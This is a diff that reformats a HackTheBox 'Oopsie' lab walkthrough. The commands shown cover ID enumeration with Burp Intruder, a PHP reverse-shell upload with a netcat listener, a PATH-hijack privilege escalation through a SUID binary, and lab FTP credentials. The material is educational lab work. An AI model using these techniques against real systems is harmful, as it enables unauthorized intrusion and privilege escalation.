@@ -5,8 +5,8 @@ This is the second box of the ‘Starting Point’ path from HackTheBox (a serie
 
 **Tools: nmap, Burp Suite, gobuster, netcat.**
 
-First of all, we can run a nmap scan — this machine’s IP is 10.10.10.28:
-> nmap -n -sSV -sC -Pn 10.10.10.28
+First of all, we can run a nmap scan — this machine’s IP is 10.10.10.28:  
+`nmap -n -sSV -sC -Pn 10.10.10.28`
 
 ![Oopsie](../Images/htb_oopsie_2.png)
 
@@ -38,8 +38,8 @@ So, back to Burp. If we access the ‘Account’ tab in the website, we’ll see
 
 ![Oopsie](../Images/htb_oopsie_8.png)
 
-Apparently, each user has an account ID and an User ID associated. We could try to manipulate this, to find out the IDs of the ‘super admin’ user. To do that on Burp, click on Ctrl+i to transfer this request information to the ‘Intruder’ tab. Under ‘Intruder’, go to the ‘Positions’ tab and click on the ‘Clear’ button on the far right, select the ‘1’ after the ID (first row of the request) and click on the ‘Add’ button. This way we’ll run a loop on this ID field, so we can test the responses and find the super admin. Now go to the ‘Payloads’ tab. I recommend creating a file with a list of IDs, from 1 to 100 — run this command in your terminal, and after that click on ‘Load…’ under ‘Payload Options’ and select the file you’ve just created.
-> for x in $(seq 1 100);do echo $x;done > ids.txt
+Apparently, each user has an account ID and an User ID associated. We could try to manipulate this, to find out the IDs of the ‘super admin’ user. To do that on Burp, click on Ctrl+i to transfer this request information to the ‘Intruder’ tab. Under ‘Intruder’, go to the ‘Positions’ tab and click on the ‘Clear’ button on the far right, select the ‘1’ after the ID (first row of the request) and click on the ‘Add’ button. This way we’ll run a loop on this ID field, so we can test the responses and find the super admin. Now go to the ‘Payloads’ tab. I recommend creating a file with a list of IDs, from 1 to 100 — run this command in your terminal, and after that click on ‘Load…’ under ‘Payload Options’ and select the file you’ve just created.  
+`for x in $(seq 1 100);do echo $x;done > ids.txt`
 
 ![Oopsie](../Images/htb_oopsie_9.png)
 
@@ -67,31 +67,33 @@ I’ve downloaded and extracted a php reverse shell from [pentestmonkey.net](htt
 
 ![Oopsie](../Images/htb_oopsie_15.png)
 
-To find out where the uploaded files go, I ran a quick gobuster:
-> gobuster dir -u http://10.10.10.28 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+To find out where the uploaded files go, I ran a quick gobuster:  
+`gobuster dir -u http://10.10.10.28 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`
 
 ![Oopsie](../Images/htb_oopsie_16.png)
 
 The files are probably at /uploads then…let’s set our netcat listening session in the terminal and try to access the reverse shell file from the browser, changing the ‘user’ as always to 86575:  
 
-**Terminal:**
-> nc -vnlp 10666
+**Terminal:**  
+`nc -vnlp 10666`
 
-**Browser:**
-> http://10.10.10.28/uploads/php-reverse-shell.php
+**Browser:**  
+`http://10.10.10.28/uploads/php-reverse-shell.php`
 
 ![Oopsie](../Images/htb_oopsie_17.png)
 
-We have a shell, but it’s a simple (dumb) shell. To upgrade it to a fully interactive shell, I quickly checked if the box had python installed. ‘python -V’ returned an error, but ‘python3 -V’ returned the Python3 version. With that in mind, I’ve used the command below to quickly upgrade my shell:
-> python3 -c ‘import pty; pty.spawn(“/bin/bash”)’
+We have a shell, but it’s a simple (dumb) shell. To upgrade it to a fully interactive shell, I quickly checked if the box had python installed. ‘python -V’ returned an error, but ‘python3 -V’ returned the Python3 version. With that in mind, I’ve used the command below to quickly upgrade my shell:  
+`python3 -c ‘import pty; pty.spawn(“/bin/bash”)’`
 
-The official walkthrough suggest the commands below, I’m posting it here as an option:
-> SHELL=/bin/bash script -q /dev/null  
-> Ctrl-Z  
-> stty raw -echo  
-> fg  
-> reset  
-> xterm  
+The official walkthrough suggest the commands below, I’m posting it here as an option:  
+```
+SHELL=/bin/bash script -q /dev/null  
+Ctrl-Z  
+stty raw -echo  
+fg  
+reset  
+xterm  
+```
 
 Upon checking it, we see that we’re logged in as www-data, so we can take a look into some folders, and eventually find the user.txt file containing the User flag, under /home/robert/
 
@@ -105,13 +107,13 @@ Quickly checking them reveals that the ‘db.php’ file has another user’s cr
 
 ![Oopsie](../Images/htb_oopsie_20.png)
 
-So let’s access Robert’s user, providing the password found.
-> su robert
+So let’s access Robert’s user, providing the password found.  
+`su robert`
 
 ![Oopsie](../Images/htb_oopsie_21.png)
 
-Upon checking its id, we see that this user is part of a ‘bugtrack’ group. We should check what files this group has access to:
-> find / -type f -group bugtracker 2> /dev/null
+Upon checking its id, we see that this user is part of a ‘bugtrack’ group. We should check what files this group has access to:  
+`find / -type f -group bugtracker 2> /dev/null`
 
 ![Oopsie](../Images/htb_oopsie_22.png)
 
@@ -119,16 +121,18 @@ So we find the binary file ‘bugtracker’. Right away we notice that it has SU
 
 ![Oopsie](../Images/htb_oopsie_23.png)
 
-There’s not much info in here, so a good option is to see what the binary does when you run it. We do so by checking its strings:
-> strings /usr/bin/bugtracker
+There’s not much info in here, so a good option is to see what the binary does when you run it. We do so by checking its strings:  
+`strings /usr/bin/bugtracker`
 
 There’s the ‘cat /root/reports’ row that grabs our attention right away. We could abuse this to escalate our privileges. The official walkthrough explains this very well:  
 
-“We see that it calls the cat binary using this relative path instead of the absolute path. By creating a malicious cat , and modifying the path to include the current working directory, we should be able to abuse this misconfiguration, and escalate our privileges to root. Let’s add the current working directory to PATH, create the malicious binary and make it executable.”
-> export PATH=/tmp:$PATH  
-> cd /tmp/  
-> echo ‘/bin/sh’ > cat  
-> chmod +x cat
+“We see that it calls the cat binary using this relative path instead of the absolute path. By creating a malicious cat , and modifying the path to include the current working directory, we should be able to abuse this misconfiguration, and escalate our privileges to root. Let’s add the current working directory to PATH, create the malicious binary and make it executable.”  
+```
+export PATH=/tmp:$PATH  
+cd /tmp/  
+echo ‘/bin/sh’ > cat  
+chmod +x cat
+```
 
 And then we run the binary once again…
 
@@ -137,10 +141,12 @@ And then we run the binary once again…
 So now we’re root!  
 At this point, I couldn’t read any files anymore in that shell, so I simply ran a ‘vim /root/root.txt’ and grabbed the root flag from inside the file.  
 
-Through further enumeration of the box, we can find FTP credentials that can be useful in the next boxes of the Starting Point path:
-> /root/.config/FileZilla  
-> ftpuser  
-> mc@F1l3ZilL4
+Through further enumeration of the box, we can find FTP credentials that can be useful in the next boxes of the Starting Point path:  
+```
+/root/.config/FileZilla  
+ftpuser  
+mc@F1l3ZilL4
+```
 
 ![Oopsie](../Images/htb_oopsie_25.png)
 
